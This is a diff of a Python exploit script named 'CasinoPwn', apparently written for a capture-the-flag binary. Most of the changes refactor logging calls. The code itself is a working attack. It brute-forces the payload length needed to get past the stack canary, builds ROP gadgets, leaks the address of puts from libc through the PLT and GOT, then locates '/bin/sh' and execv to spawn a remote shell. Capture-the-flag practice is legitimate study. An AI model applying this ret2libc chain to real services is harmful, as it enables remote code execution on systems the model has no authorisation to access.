@@ -47,7 +47,7 @@ class CasinoPwn(PwnTarget):
 
 
     def find_canary_alternative(cls, config: Config):
-        logger.disable('__main__')
+        cls.logger.disable('__main__')
         done = False
         choices = tuple((range(0x10, 0x900 - 0x38 - 0x8, 0x10)))
         t = TargetBase(pwn_target=CasinoPwn, config=config)
@@ -86,12 +86,12 @@ class CasinoPwn(PwnTarget):
                 pbar.update(1)
                 time.sleep(0.2)
                 t.reconnect()
-        logger.enable('__main__')
+        cls.logger.enable('__main__')
         if done:
-            logger.success(f'Found size of payload to overwrite stack cookie: {hex(next_payload_size)}')
+            cls.logger.success(f'Found size of payload to overwrite stack cookie: {hex(next_payload_size)}')
             t.file.address = file_base
             return next_payload_size, t
-        logger.critical("Failed to guess payload size")
+        cls.logger.critical("Failed to guess payload size")
         exit(0)
 
 
@@ -106,20 +106,18 @@ if __name__ == '__main__':
         libc='libc6_2.27-3ubuntu1.4_amd64',
         # libc='libc6_2.28-10+deb10u1_amd64',
     )
-    payload_size, t = find_canary_alternative(remote_config)
-    # _, debugger = gdb.attach(t.process.pid, api=True)
-    # debugger.execute('c')
+    payload_size, t = CasinoPwn.find_canary_alternative(remote_config)
     last_chance_address = t.file.symbols['last_chance']
-    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.file.address
+    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix
 
     result = FindFunction.execute(t, 'puts', Method.PLT)
     if not result:
-        logger.critical(f"Failed to get a print function")
+        t.logger.critical(f"Failed to get a print function")
         exit(0)
     print_function_name, print_function_address = result
     result = FindFunction.execute(t, 'puts', Method.GOT)
     if not result:
-        logger.critical(f"Failed to get a print function")
+        t.logger.critical(f"Failed to get a print function")
         exit(0)
     target_function_name, target_function_address = result
 
@@ -141,20 +139,20 @@ if __name__ == '__main__':
     t.process.sendline(payload)
     data = t.process.recvline()[:-1]
     if len(data) > 8:
-        logger.critical("Unexpected number of bytes received")
+        t.logger.critical("Unexpected number of bytes received")
         exit(0)
     puts_address = u64(data.ljust(8, b'\0'))
-    logger.info(f"Leaked libc address: {target_function_name}@{hex(puts_address)}")
+    t.logger.info(f"Leaked libc address: {target_function_name}@{hex(puts_address)}")
 
     payload_size -= 0x20
 
     GetLibcAddress.libc_update_base_address(t, [('puts', puts_address)])
     print(t.process.clean())
-    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.file.address
+    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.base_address_fix
     sh_address = next(t.libc.search(b'/bin/sh\0'))
-    logger.success(f"/bin/sh address: {hex(sh_address)}")
+    t.logger.success(f"/bin/sh address: {hex(sh_address)}")
     execv_address = t.libc.symbols['execv']
-    logger.success(f"Using execv@{hex(execv_address)}")
+    t.logger.success(f"Using execv@{hex(execv_address)}")
 
     rop_chain = (
             p64(pop_rdi) +
